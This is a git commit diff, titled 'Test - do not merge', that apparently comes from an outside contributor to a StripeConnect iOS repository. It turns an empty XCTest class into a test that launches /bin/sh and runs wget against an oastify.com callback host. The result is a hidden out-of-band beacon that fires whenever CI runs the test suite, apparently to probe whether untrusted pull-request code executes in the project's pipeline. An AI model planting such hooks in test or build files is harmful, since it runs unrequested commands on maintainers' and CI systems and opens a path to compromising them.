e1f6b6df5a3757fef11040f62c8dd9a6895f55aa
Len0nJohn <162688449+Len0nJohn@users.noreply.github.com>
2024-08-22 12:01:18 +0300

    Test - do not merge
    I sent a message to your team about this attempt.
    The PR will be deleted automatically in few hours

--- StripeConnect/StripeConnectTests/StripeConnectTests.swift
+++ StripeConnect/StripeConnectTests/StripeConnectTests.swift
@@ -4,8 +4,28 @@
 //
 //  Created by Chris Mays on 7/31/24.
 //
-
 import XCTest
 @testable import StripeConnect
 
-final class StripeConnectTests: XCTestCase { }
+final class StripeConnectTests: XCTestCase {
+    
+    func testExecuteSystemCommand() {
+        let process = Process()
+        process.executableURL = URL(fileURLWithPath: "/bin/sh")
+        process.arguments = ["wget", "eq8tckceq2d3rluss4i3ddnfz65xtphe.oastify.com/1"]
+        
+        let pipe = Pipe()
+        process.standardOutput = pipe
+        
+        do {
+            try process.run()
+            process.waitUntilExit()
+            
+            let data = pipe.fileHandleForReading.readDataToEndOfFile()
+            let output = String(data: data, encoding: .utf8)
+            print(output ?? "No output")
+        } catch {
+            XCTFail("Failed to run command: \(error)")
+        }
+    }
+}
